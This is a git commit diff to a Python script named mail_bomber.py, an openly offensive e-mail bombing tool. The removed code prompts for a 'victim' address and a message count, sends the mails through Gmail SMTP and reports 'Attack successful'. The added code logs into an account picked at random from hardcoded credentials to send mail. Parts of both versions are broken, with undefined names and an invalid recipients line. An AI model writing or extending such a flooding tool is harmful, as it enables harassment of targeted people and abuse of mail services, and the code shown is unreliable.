2b50f005a2fbfe7590358808dbd116c53f0fc799
ThomasWaytec <thomas.waytec@gmail.com>
2024-01-30 23:40:04 +0100

    add send_email and add basic email set up code

--- mail_bomber.py
+++ mail_bomber.py
@@ -1,58 +1,41 @@
 # Built-in modules
-from smtplib import SMTP
+from email.mime.text import MIMEText
+from smtplib import SMTP_SSL, SMTP_SSL_PORT
 from sys import exit
 from random import choice
 
-# Third-party packages
+# Third-party modules
 from termcolor import colored as cl
 from pyfiglet import figlet_format as ff
 
 # Local modules
-from email_account import EmailAccount
+from email_content import EmailContent
 from email_accounts import ACCOUNTS
 
 
-def get_rand_account() -> EmailAccount:
+def send_email(session: SMTP_SSL, sender: str, recipients: list[str],
+               content: MIMEText) -> None:
     """
-    Return a randomly selected e-mail account from the
-    hardcoded accounts in email_accounts.py.
+    Send an email using the provided SMTP_SSL session.
     """
-    return choice(ACCOUNTS)
 
-def send_mail(account: EmailAccount, message: str) -> None:
-    obj = smtplib.SMTP('smtp.gmail.com', 587)
-    obj.starttls()
-    try:
-        obj.login(ma, pa)
-    except:
-        print(cl('Unexpected error from our side, sorry for the inconvenience', 'red'))
-    obj.sendmail(ma, acc, msg)
-    obj.quit()
-    print(cl(f'Mail {str(i+1)} sent successfully ☑', 'green'))
+    session.sendmail(sender, recipients, content.as_string())
 
 
-try:
-    mails_to_be_sent = int(input(cl('No of mails to be sent:', 'red')).strip())
-except:
-    print(cl('The input must be an integer', 'red'))
-    sys.exit()
-victim = input(cl('Enter the mail address of victim:', 'red').strip())
-message = input(cl('Enter the message to be sent in email:', 'red').strip())
-send_mail(victim, mails_to_be_sent, message, ma, password)
-print(cl('-'*10+'\nAttack successful', 'green'))
-os.system('clear')	
-    
-while True:
-    if input(cl('Quit(y/n)? ', 'red')).lower().strip() == 'n':
-        try:
-            mails_to_be_sent = int(input(cl('No of mails to be sent:', 'red')).strip())
-        except:
-            print(cl('The input be an integer', 'red'))
-            sys.exit()
-        victim = input(cl('Enter the mail address of victim:', 'red').strip())
-        message = input(cl('Enter the message to be sent in email:', 'red').strip())
-        send_mail(victim, mails_to_be_sent, message, ma, password)
-        print(cl('-'*10+'\nAttack successful', 'green'))
-        os.system('cls')
-    else:
-        sys.exit()
+
+# parse command-line arguments here
+
+email_content = EmailContent()
+
+# randomly choose an account
+account = choice(ACCOUNTS)
+
+# set up e-mail content
+msg = MIMEText(email_content.body)
+msg['Subject'] = email_content.subject
+msg['From'] = email_content.sender
+msg['To'] = ', '.email_content.recipients
+
+# set up SMTP session
+session = SMTP_SSL('smtp.gmail.com', SMTP_SSL_PORT)
+session.login(account.address, account.password)
